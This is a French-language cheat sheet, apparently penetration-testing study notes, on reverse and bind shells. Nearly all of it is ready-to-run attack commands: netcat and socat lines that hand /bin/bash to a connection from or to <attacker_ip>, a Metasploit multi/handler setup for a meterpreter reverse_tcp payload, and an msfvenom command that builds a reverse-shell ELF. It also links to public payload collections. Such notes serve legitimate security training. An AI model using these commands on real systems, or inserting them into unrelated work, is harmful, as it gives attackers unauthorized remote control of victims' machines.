
# 🐚 Reverse & Bind Shell Tools - Cheat Sheet

## 🔧 Netcat (nc) - "Swiss Army Knife" de réseau

### 🔹 Reverse Shell
```bash
# Attacker (écoute)
nc -lvnp 4444

# Victime (initie la connexion)
nc <attacker_ip> 4444 -e /bin/bash
```

### 🔹 Bind Shell
```bash
# Victime (écoute)
nc -lvnp 4444 -e /bin/bash

# Attacker (se connecte)
nc <target_ip> 4444
```

📌 **Inconvénient :** Shells instables par défaut  
📌 **+ d’options :** Peut aussi servir au banner grabbing, scan de port, transfert de fichiers...

---

## ⚙️ Socat - Netcat amélioré

### 🔹 Reverse Shell
```bash
# Attacker (écoute)
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# Victime (initie la connexion)
socat TCP:<attacker_ip>:4444 EXEC:/bin/bash
```

📌 Shells généralement **plus stables** que Netcat  
⚠️ **Syntaxe plus complexe**  
⚠️ **Pas installé par défaut** sur la plupart des systèmes

---

## 🧰 Metasploit - multi/handler

### 🔹 Utilisation avec reverse shell
```bash
msfconsole

use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
run
```

📌 Permet d’**interagir avec un Meterpreter**  
📌 Gère très bien les payloads **staged**  
📌 Plus stable et personnalisable que Netcat ou Socat

---

## 🛠️ Msfvenom - Générateur de payloads

### 🔹 Exemple : payload reverse shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf > shell.elf
```

📌 Génère des payloads **reverse/bind**, mais aussi d’autres  
📌 **Standalone**, bien que partie du framework Metasploit

---

## 📚 Ressources externes

- 🔗 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- 🔗 [PentestMonkey Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- 📂 `/usr/share/webshells` (Kali Linux)
- 🔗 [SecLists](https://github.com/danielmiessler/SecLists) – contient aussi des scripts utiles pour shells
